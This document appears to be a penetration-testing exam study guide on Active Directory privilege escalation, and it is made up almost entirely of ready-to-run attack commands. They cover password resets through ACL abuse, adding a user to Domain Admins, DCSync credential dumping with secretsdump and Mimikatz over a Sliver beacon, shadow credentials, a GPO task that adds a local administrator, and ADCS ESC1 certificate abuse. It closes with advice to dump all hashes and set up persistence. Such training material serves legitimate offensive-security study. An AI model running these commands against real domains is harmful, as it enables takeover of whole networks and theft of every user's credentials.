# Phase 10: Domain Privilege Escalation

> From domain user to Domain Admin via ACL chains, group membership abuse, and misconfigurations.

---

## 1. ACL Abuse — The Most Common Exam Path

### GenericAll / GenericWrite on User → Reset Password

```powershell
# PowerView
$pw = ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force
Set-DomainUserPassword -Identity targetuser -AccountPassword $pw

# Linux
net rpc password targetuser 'NewPass123!' -U 'domain.local/youruser%YourPass' -S <dc_ip>
```

### AddMember on Domain Admins

```powershell
Add-DomainGroupMember -Identity 'Domain Admins' -Members youruser
# Verify
Get-DomainGroupMember 'Domain Admins'
```

### WriteDACL on Domain Object → Grant DCSync

```powershell
Add-DomainObjectACL -TargetIdentity "DC=domain,DC=local" -PrincipalIdentity youruser -Rights DCSync
# Now DCSync as youruser:
secretsdump.py domain.local/youruser:Password1@<dc_ip>
```

### WriteOwner → Take Ownership → GenericAll

```powershell
Set-DomainObjectOwner -Identity 'Domain Admins' -OwnerIdentity youruser
Add-DomainObjectACL -TargetIdentity 'Domain Admins' -PrincipalIdentity youruser -Rights All
Add-DomainGroupMember -Identity 'Domain Admins' -Members youruser
```

---

## 2. Shadow Credentials (msDS-KeyCredentialLink)

```bash
# If you have GenericWrite/GenericAll on a user/computer:
certipy shadow auto -u youruser@domain.local -p Password1 -account targetuser -dc-ip <dc_ip>
# → Returns NTLM hash of targetuser → PtH
```

---

## 3. DCSync (Once Rights Acquired)

```bash
# Dump all domain hashes
secretsdump.py domain.local/youruser:Password1@<dc_ip>

# Just krbtgt (for Golden Ticket)
secretsdump.py domain.local/administrator:Password1@<dc_ip> -just-dc-user krbtgt

# From Mimikatz (in-memory via C2)
sliver (beacon) > execute-assembly /tools/Mimikatz.exe "lsadump::dcsync /user:krbtgt /domain:domain.local" exit
```

---

## 4. GPO Abuse

```bash
# If you have write rights on a GPO applied to a target OU:
sliver (beacon) > execute-assembly /tools/SharpGPOAbuse.exe \
  --AddComputerTask --TaskName "Update" --Author domain\administrator \
  --Command "cmd.exe" --Arguments "/c net localgroup administrators youruser /add" \
  --GPOName "Default Domain Policy"

# Force immediate GPO apply
Invoke-GPUpdate -Computer target -Force
```

---

## 5. AD CS Escalation (If ADCS Present)

```bash
# Enumerate vulnerable templates
certipy find -u youruser@domain.local -p Password1 -dc-ip <dc_ip> -vulnerable

# ESC1 — request cert as Domain Admin
certipy req -u youruser@domain.local -p Password1 \
  -ca domain-DC01-CA -template VulnTemplate \
  -upn administrator@domain.local -dc-ip <dc_ip>
certipy auth -pfx administrator.pfx -dc-ip <dc_ip>
# → NT hash of administrator → DCSync
```

---

## Exam Tip

After gaining DA: immediately collect flags, run DCSync to dump all hashes, and establish persistence. Don't assume you'll stay in the environment — exam sessions can have instabilities.

---

## Next Step → **Phase 11: AD Persistence** (`11-ad-persistence.md`)
